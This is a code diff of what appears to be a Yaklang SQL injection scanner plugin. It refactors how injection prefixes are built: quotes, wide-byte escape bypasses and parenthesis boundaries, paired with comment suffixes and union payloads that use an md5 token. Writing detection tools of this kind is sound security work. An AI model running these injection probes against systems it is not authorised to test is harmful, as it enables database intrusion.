@@ -30,10 +30,7 @@ unionPayloads = func(checkType) {
 
     // base
     var payloads = []
-    for in 3 {
-        payloads.Push(sprint(basicItem))
-    }
-
+    payloads.Push(basicItem)
     var results = []
     for i in 16 {
         payloads.Push(basicItem)
@@ -43,7 +40,29 @@ unionPayloads = func(checkType) {
     return results, token
 }
 
+sqlBuildPerfix = func(paramValue) {
+    pureInt = str.IsDigit(paramValue)
 
+    wideByte = string([uint8(randn(129, 254))])
+    prefix = []
+
+    valueList = [paramValue]
+    boundaryList = [" ",")","))"]
+
+    formatString = "%s"
+    if !pureInt {
+        formatString = formatString + wideByte + "'"
+        valueList = append(valueList, randstr(10))
+    }
+    formatString = formatString + "%s"
+
+    for v  in valueList {
+        for b in boundaryList {
+            prefix.Push(sprintf(formatString,v,b))
+        }
+    }
+    return prefix
+}
 
 sqlInjectionChecking = func(https, request) {
     freq = fuzz.HTTPRequest(request, fuzz.https(https))~
@@ -61,29 +80,9 @@ sqlInjectionChecking = func(https, request) {
     /* 开始根据参数进行检测 */
     for i in params {
         paramName = i.Name()
-        paramValue = freq.GetQueryValue(paramName)
-
-        info(f`参数名：${paramName} 参数值: ${paramValue}`)
-        // pureInt = 
-        _, err = atoi(paramValue)
-        pureInt = err == nil
-
-        prefix = []
+        paramValue = i.ValueString()
+        prefix = sqlBuildPerfix(paramValue)
         suffix = [" -- ", " # "]
-        if pureInt {
-            prefix.Push(sprint(paramValue) + " ")
-            prefix.Push(sprint(paramValue) + ")")
-            prefix.Push(sprint(paramValue) + "))")
-        } else {
-            info("开始进行字符串检测")
-            prefix.Push(sprint(paramValue) + "'")
-            prefix.Push(sprint(paramValue) + "')")
-            prefix.Push(sprint(paramValue) + "'))")
-            prefix.Push(sprint(randstr(10)) + "'")
-            prefix.Push(sprint(randstr(10)) + "')")
-            prefix.Push(sprint(randstr(10)) + "'))")
-        }
-
         payloads, token = unionPayloads("md5")
         token = sprint(token)
         info(f"Payload: ${len(payloads)} Prefix:${len(prefix)} Suffix:${len(suffix)} TOKEN 为 " + sprint(token))
